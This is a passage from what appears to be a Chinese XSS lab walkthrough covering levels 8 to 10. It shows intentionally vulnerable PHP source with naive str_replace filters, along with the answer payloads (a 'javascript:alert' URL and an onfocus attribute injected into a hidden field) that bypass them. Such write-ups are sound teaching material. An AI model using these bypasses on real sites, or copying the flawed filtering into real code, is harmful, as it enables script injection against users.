class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;sr_c&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;da_ta&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;hr_ef&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&amp;quot&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level8.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; &lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 9&lt;&#x2F;p&gt;
&lt;p&gt;本题相较Level 8新增了网址合法性检测，经测试只需带有&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;xn--zlr2ki56c6eedn6choa&#x2F;&quot;&gt;http:&#x2F;&#x2F;即可通过检测&lt;&#x2F;a&gt;，可以将alert()内的字符改成http:&#x2F;&#x2F;，也可以在文末添加并使用注释符进行注释。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155310700.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155310700.png&quot; alt&#x3D;&quot;image-20240202155310700&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;javaScript:alert(&#39;http:&#x2F;&#x2F;&#39;)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;即：javascript:alert(‘http:&#x2F;&#x2F;’)&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;sr_c&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;da_ta&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;hr_ef&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&amp;quot&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level9.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;if&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;literal&quot;&gt;false&lt;&#x2F;span&gt;&#x3D;&#x3D;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strpos&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;http:&#x2F;&#x2F;&#x27;&lt;&#x2F;span&gt;))&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;        &#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;else&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 10&lt;&#x2F;p&gt;
&lt;p&gt;测试第一个标签处，发现全都被过滤&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;cac51a8eb6fd47de8782e2b57d225cf8.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;cac51a8eb6fd47de8782e2b57d225cf8.png&quot; alt&#x3D;&quot;img&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;只能从源代码中的三个hidden元素入手，进行传值测试后发现t_sort有回显(GET)，其余两个猜测为POST型&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155934507.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155934507.png&quot; alt&#x3D;&quot;image-20240202155934507&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;?t_sort&#x3D;&quot; onfocus&#x3D;javascript:alert() type&#x3D;&quot;text&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; ，因为此处输入框被隐藏，需要添加type&#x3D;“text”，或者在控制台内修改此处的hidden为button等。&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level10.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ 